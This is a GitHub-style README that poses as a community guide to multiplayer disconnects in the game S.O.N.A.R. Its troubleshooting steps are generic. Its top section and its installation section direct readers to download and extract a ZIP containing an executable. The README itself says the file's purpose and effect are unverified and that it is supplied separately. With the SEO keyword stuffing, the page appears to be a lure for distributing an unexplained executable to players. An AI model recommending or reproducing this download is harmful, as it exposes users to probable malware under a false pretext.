# S.O.N.A.R. — Co-op Disconnect Diagnostics

<p align="center">
  <img src="https://i.postimg.cc/YCz7wv8s/banner.png" alt="S.O.N.A.R. — Co-op Disconnect Diagnostics Banner" width="100%">
</p>

> **S.O.N.A.R. Co-op Disconnect Diagnostics** — a focused Windows PC troubleshooting resource for multiplayer disconnects, host migration and co-op lobby stability.

![Windows](https://img.shields.io/badge/Platform-Windows-0078D7?style=flat-square) ![Guide](https://img.shields.io/badge/Type-Troubleshooting_Guide-646cff?style=flat-square) ![Version](https://img.shields.io/badge/Release-v3.6.1-2ea043?style=flat-square)

## 📥 DOWNLOAD

### ⬇️ **[DOWNLOAD ZIP ARCHIVE — sonar-submarine-coop-disconnect-check.zip](../../releases/latest/download/sonar-submarine-coop-disconnect-check.zip)**

**Latest release:** [Open GitHub Releases](../../releases/latest)

## 🎯 What This Does

This project documents how to recognize and troubleshoot **co-op disconnect diagnostics** in **S.O.N.A.R.**. It focuses on **Multiplayer disconnects, host migration and co-op lobby stability** with targeted checks, patch awareness, and reproducible testing so players can narrow down the actual cause instead of guessing.

## ✨ Features

- Isolates disconnects by testing host-and-one-guest sessions before full crews.
- Compares results when the host changes or leaves the submarine session.
- Checks game-version parity and Steam/network access for crew connectivity.

## 🔎 Symptoms Covered

- A crew member disconnects during a co-op dive.
- Players cannot join or remain in the lobby.
- The session changes behavior after the host leaves.

## 🛠️ Troubleshooting — Step by Step

1. **Match game versions.** Have every crew member update S.O.N.A.R. before retrying invitations.
2. **Start with the smallest session.** Join with the host and one guest first; add more players after confirming stability.
3. **Rotate the host.** If disconnects follow the host, have another player host a new lobby.
4. **Check connectivity.** Verify that Steam is online, local firewalls are not blocking the game, and VPN/proxy connections are not disrupting routing.
5. **Record the failure.** Note which player disconnected, whether it happened during host change, and if others stayed connected.

## ✅ Version & Patch Context

Testing discussions include disconnects and post-host-change issues. Their current status may differ from prerelease testing.

## 🚀 Download & Installation

1. Open the latest GitHub Release.
2. Download **`sonar-submarine-coop-disconnect-check.zip`** and extract it to a folder on Windows.
3. The archive contains **`sonar-submarine-coop-disconnect-check.exe`** with support files.
4. Follow the game-specific checks above to troubleshoot the issue.

The bundled Windows executable is an updater supplied separately from this troubleshooting guide. Its ability to fix **S.O.N.A.R.** has not been established; launching it is not a verified solution to the problem described here.

## ❓ FAQ

**Does this project document an official game fix?**  
No. This is an independent community guide. Where an official patch addressed an issue, that context is noted above.

**What if I still see the issue after updating?**  
Record the exact game build, hardware and reproduction steps, then compare your result against each check in order.

**What if I only encounter the issue in multiplayer?**  
Test in a fresh session with the smallest possible party and record which player hosts.

**Where can I find the downloadable archive?**  
Use the GitHub Releases links at the top of this page.

## 📄 License

MIT for repository-authored documentation and metadata only. Bundled third-party executable and support files are not relicensed by this repository.

---

## 🔑 SEO Keywords

`SONAR submarine multiplayer disconnect`, `S.O.N.A.R. cant join friends`, `SONAR coop connection problem`, `SONAR host migration disconnect`, `SONAR submarine lobby error`, `SONAR multiplayer desync`

### GitHub Topics

`sonar-game` `submarine-game` `coop` `multiplayer` `network-troubleshooting` `connection-issues` `host-migration` `lobby-issues` `windows` `pc-gaming` `steam-multiplayer` `network-diagnostics` `connection-guide` `party-connectivity` `troubleshooting`
